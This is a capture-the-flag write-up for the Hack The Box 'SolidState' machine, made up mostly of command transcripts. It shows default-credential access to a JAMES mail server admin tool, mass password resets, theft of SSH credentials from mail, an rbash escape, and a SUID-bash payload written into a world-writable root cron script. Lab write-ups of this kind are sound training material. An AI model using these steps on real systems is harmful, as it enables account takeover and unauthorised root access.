# Target
| Category          | Details                                                      |
|-------------------|--------------------------------------------------------------|
| 📝 **Name**       | [SolidState](https://app.hackthebox.com/machines/SolidState) |  
| 🏷 **Type**       | HTB Machine                                                  |
| 🖥 **OS**         | Linux                                                        |
| 🎯 **Difficulty** | Medium                                                       |
| 📁 **Tags**       | James 2.3.2, rbash escape, restricted bash escape            |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB SolidState]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-12 16:49 +0100
Nmap scan report for 10.129.6.172
Host is up (0.027s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 419.57 seconds
```

#### Change POP3 credentials using default `root:root` credentials for JAMES Remote Administration
```
┌──(magicrc㉿perun)-[~/attack/HTB SolidState]
└─$ nc $TARGET 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
setpassword james pass
Password for james reset
setpassword thomas pass
Password for thomas reset
setpassword john pass
Password for john reset
setpassword mindy pass
Password for mindy reset
setpassword mailadmin pass
Password for mailadmin reset
quit
Bye
```

#### Read emails for user `john`
```
┌──(magicrc㉿perun)-[~/attack/HTB SolidState]
└─$ nc -C $TARGET 110
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john
+OK
PASS pass
+OK Welcome john
LIST
+OK 1 743
1 743
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```

#### Discover plaintext SSH credentials for user `mindy`
```
┌──(magicrc㉿perun)-[~/attack/HTB SolidState]
└─$ nc -C $TARGET 110
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS pass
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

#### Access target using `mindy:P@55W0rd1!2@` credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB SolidState]
└─$ ssh mindy@$TARGET         
<SNIP>
mindy@solidstate:~$
```

#### Capture user flag
```
mindy@solidstate:~$ cat /home/mindy/user.txt 
2b93760ca46ed7a7d5a16772952b4676
```

### Root flag

#### Bypass restricted bash using pseudo-terminal allocation option in `ssh`
```
┌──(magicrc㉿perun)-[~/attack/HTB SolidState]
└─$ ssh mindy@$TARGET -t bash
mindy@10.129.7.13's password: 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
```

#### Discover `/opt/tmp.py` being periodically executed by `root`
```
2026/03/13 03:45:01 CMD: UID=0     PID=3873   | /bin/sh -c python /opt/tmp.py 
2026/03/13 03:45:01 CMD: UID=0     PID=3874   | python /opt/tmp.py 
2026/03/13 03:45:01 CMD: UID=0     PID=3875   | sh -c rm -r /tmp/*  
```

#### Investigate `/opt/tmp.py` script
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat -n /opt/tmp.py
     1 #!/usr/bin/env python
     2 import os
     3 import sys
     4 try:
     5      os.system('rm -r /tmp/* ')
     6 except:
     7      sys.exit()
     8
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls -l /opt/tmp.py
-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
```
Since we have write permission to `/opt/tmp.py` we could exploit this to spawn root shell.

#### Overwrite `/opt/tmp.py` with root shell spawner
```
cat <<'EOF'> /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('/bin/cp /bin/bash /tmp/root_shell && /bin/chmod +s /tmp/root_shell')
except:
     sys.exit()
EOF
```
Wait for `/tmp/root_shell` to be created.

#### Escalate to `root` user using created `/tmp/root_shell`
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ /tmp/root_shell -p
root_shell-4.4# id
uid=1001(mindy) gid=1001(mindy) euid=0(root) egid=0(root) groups=0(root),1001(mindy)
```

#### Capture root flag
```
root_shell-4.4# cat /root/root.txt 
82262b3f53744879e77839848cf587c1
```
